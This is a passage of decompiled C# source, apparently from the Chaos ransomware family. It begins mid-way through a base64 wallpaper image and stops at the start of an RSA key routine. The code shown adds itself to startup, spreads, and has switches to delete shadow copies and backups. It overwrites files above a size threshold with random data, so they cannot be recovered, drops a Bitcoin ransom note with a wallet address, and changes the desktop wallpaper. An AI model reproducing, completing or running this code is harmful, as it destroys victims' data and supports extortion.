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";

	public static string appMutexStartup = "1qw0ll8p9m8uezhqhyd";

	private static string droppedMessageTextbox = "read_it.txt";

	private static bool checkAdminPrivilage = false;

	private static bool checkdeleteShadowCopies = false;

	private static bool checkdisableRecoveryMode = false;

	private static bool checkdeleteBackupCatalog = false;

	public static string appMutexStartup2 = "17CqMQFeuB3NTzJ";

	public static string appMutex2 = appMutexStartup2 + appMutexRun2;

	public static string staticSplit = "bc";

	public static string appMutex = staticSplit + appMutexStartup + appMutexRun;

	public static readonly Regex appMutexRegex = new Regex("(?:[13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})");

	private static string[] messages = new string[15]
	{
		"----> Chaos is multi language ransomware. Translate your note to any language <----", "All of your files have been encrypted", "Your computer was infected with a ransomware virus. Your files have been encrypted and you won't ", "be able to decrypt them without our help.What can I do to get my files back?You can buy our special ", "decryption software, this software will allow you to recover all of your data and remove the", "ransomware from your computer.The price for the software is $1,500. Payment can be made in Bitcoin only.", "How do I pay, where do I get Bitcoin?", "Purchasing Bitcoin varies from country to country, you are best advised to do a quick google search", "yourself  to find out how to buy Bitcoin. ", "Many of our customers have reported these sites to be fast and reliable:",
		"Coinmama - hxxps://www.coinmama.com Bitpanda - hxxps://www.bitpanda.com", "", "Payment informationAmount: 0.1473766 BTC", "Bitcoin Address:  bc1qlnzcep4l4ac0ttdrq7awxev9ehu465f2vpt9x0", ""
	};

	private static string[] validExtensions = new string[229]
	{
		".txt", ".jar", ".dat", ".contact", ".settings", ".doc", ".docx", ".xls", ".xlsx", ".ppt",
		".pptx", ".odt", ".jpg", ".mka", ".mhtml", ".oqy", ".png", ".csv", ".py", ".sql",
		".mdb", ".php", ".asp", ".aspx", ".html", ".htm", ".xml", ".psd", ".pdf", ".xla",
		".cub", ".dae", ".indd", ".cs", ".mp3", ".mp4", ".dwg", ".zip", ".rar", ".mov",
		".rtf", ".bmp", ".mkv", ".avi", ".apk", ".lnk", ".dib", ".dic", ".dif", ".divx",
		".iso", ".7zip", ".ace", ".arj", ".bz2", ".cab", ".gzip", ".lzh", ".tar", ".jpeg",
		".xz", ".mpeg", ".torrent", ".mpg", ".core", ".pdb", ".ico", ".pas", ".db", ".wmv",
		".swf", ".cer", ".bak", ".backup", ".accdb", ".bay", ".p7c", ".exif", ".vss", ".raw",
		".m4a", ".wma", ".flv", ".sie", ".sum", ".ibank", ".wallet", ".css", ".js", ".rb",
		".crt", ".xlsm", ".xlsb", ".7z", ".cpp", ".java", ".jpe", ".ini", ".blob", ".wps",
		".docm", ".wav", ".3gp", ".webm", ".m4v", ".amv", ".m4p", ".svg", ".ods", ".bk",
		".vdi", ".vmdk", ".onepkg", ".accde", ".jsp", ".json", ".gif", ".log", ".gz", ".config",
		".vb", ".m1v", ".sln", ".pst", ".obj", ".xlam", ".djvu", ".inc", ".cvs", ".dbf",
		".tbi", ".wpd", ".dot", ".dotx", ".xltx", ".pptm", ".potx", ".potm", ".pot", ".xlw",
		".xps", ".xsd", ".xsf", ".xsl", ".kmz", ".accdr", ".stm", ".accdt", ".ppam", ".pps",
		".ppsm", ".1cd", ".3ds", ".3fr", ".3g2", ".accda", ".accdc", ".accdw", ".adp", ".ai",
		".ai3", ".ai4", ".ai5", ".ai6", ".ai7", ".ai8", ".arw", ".ascx", ".asm", ".asmx",
		".avs", ".bin", ".cfm", ".dbx", ".dcm", ".dcr", ".pict", ".rgbe", ".dwt", ".f4v",
		".exr", ".kwm", ".max", ".mda", ".mde", ".mdf", ".mdw", ".mht", ".mpv", ".msg",
		".myi", ".nef", ".odc", ".geo", ".swift", ".odm", ".odp", ".oft", ".orf", ".pfx",
		".p12", ".pl", ".pls", ".safe", ".tab", ".vbs", ".xlk", ".xlm", ".xlt", ".xltm",
		".svgz", ".slk", ".tar.gz", ".dmg", ".ps", ".psb", ".tif", ".rss", ".key", ".vob",
		".epsp", ".dc3", ".iff", ".onepkg", ".onetoc2", ".opt", ".p7b", ".pam", ".r3d"
	};

	private static Random random = new Random();

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(uint action, uint uParam, string vParam, uint winIni);

	private static void Main(string[] args)
	{
		if (AlreadyRunning())
		{
			Environment.Exit(1);
		}
		if (checkSleep)
		{
			sleepOutOfTempFolder();
		}
		if (checkAdminPrivilage)
		{
			copyResistForAdmin(processName);
		}
		else if (checkCopyRoaming)
		{
			copyRoaming(processName);
		}
		if (checkStartupFolder)
		{
			addLinkToStartup();
		}
		lookForDirectories();
		if (checkAdminPrivilage)
		{
			if (checkdeleteShadowCopies)
			{
				deleteShadowCopies();
			}
			if (checkdisableRecoveryMode)
			{
				disableRecoveryMode();
			}
			if (checkdeleteBackupCatalog)
			{
				deleteBackupCatalog();
			}
		}
		if (checkSpread)
		{
			spreadIt(spreadName);
		}
		addAndOpenNote();
		SetWallpaper(base64Image);
		new Thread((ThreadStart)delegate
		{
			Run();
		}).Start();
	}

	public static void Run()
	{
		Application.Run((Form)(object)new driveNotification.NotificationForm());
	}

	private static void sleepOutOfTempFolder()
	{
		string directoryName = Path.GetDirectoryName(Assembly.GetEntryAssembly().Location);
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		if (directoryName != folderPath)
		{
			Thread.Sleep(sleepTextbox * 1000);
		}
	}

	private static bool AlreadyRunning()
	{
		Process[] processes = Process.GetProcesses();
		Process currentProcess = Process.GetCurrentProcess();
		Process[] array = processes;
		foreach (Process process in array)
		{
			try
			{
				if (process.Modules[0].FileName == Assembly.GetExecutingAssembly().Location && currentProcess.Id != process.Id)
				{
					return true;
				}
			}
			catch (Exception)
			{
			}
		}
		return false;
	}

	public static byte[] random_bytes(int length)
	{
		Random random = new Random();
		length++;
		byte[] array = new byte[length];
		random.NextBytes(array);
		return array;
	}

	public static string RandomString(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < length; i++)
		{
			char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
			stringBuilder.Append(value);
		}
		return stringBuilder.ToString();
	}

	public static string RandomStringForExtension(int length)
	{
		if (encryptedFileExtension == "")
		{
			StringBuilder stringBuilder = new StringBuilder();
			for (int i = 0; i < length; i++)
			{
				char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
				stringBuilder.Append(value);
			}
			return stringBuilder.ToString();
		}
		return encryptedFileExtension;
	}

	public static string Base64EncodeString(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return Convert.ToBase64String(bytes);
	}

	public static string randomEncode(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return "<EncyptedKey>" + Base64EncodeString(RandomString(41)) + "<EncyptedKey> " + RandomString(2) + Convert.ToBase64String(bytes);
	}

	private static void encryptDirectory(string location)
	{
		try
		{
			string[] files = Directory.GetFiles(location);
			bool flag = true;
			for (int i = 0; i < files.Length; i++)
			{
				try
				{
					string extension = Path.GetExtension(files[i]);
					string fileName = Path.GetFileName(files[i]);
					if (!Array.Exists(validExtensions, (string E) => E == extension.ToLower()) || !(fileName != droppedMessageTextbox))
					{
						continue;
					}
					FileInfo fileInfo = new FileInfo(files[i]);
					fileInfo.Attributes = FileAttributes.Normal;
					if (fileInfo.Length < 2117152)
					{
						if (encryptionAesRsa)
						{
							EncryptFile(files[i]);
						}
					}
					else if (fileInfo.Length > 200000000)
					{
						Random random = new Random();
						int length = random.Next(200000000, 300000000);
						string @string = Encoding.UTF8.GetString(random_bytes(length));
						File.WriteAllText(files[i], randomEncode(@string));
						File.Move(files[i], files[i] + "." + RandomStringForExtension(4));
					}
					else
					{
						string string2 = Encoding.UTF8.GetString(random_bytes(Convert.ToInt32(fileInfo.Length) / 4));
						File.WriteAllText(files[i], randomEncode(string2));
						File.Move(files[i], files[i] + "." + RandomStringForExtension(4));
					}
					if (flag)
					{
						flag = false;
						File.WriteAllLines(location + "/" + droppedMessageTextbox, messages);
					}
				}
				catch
				{
				}
			}
			string[] directories = Directory.GetDirectories(location);
			for (int j = 0; j < directories.Length; j++)
			{
				encryptDirectory(directories[j]);
			}
		}
		catch (Exception)
		{
		}
	}

	public static string rsaKey()
	{
		StringBuilder stringBuilder = new StringBuilder();
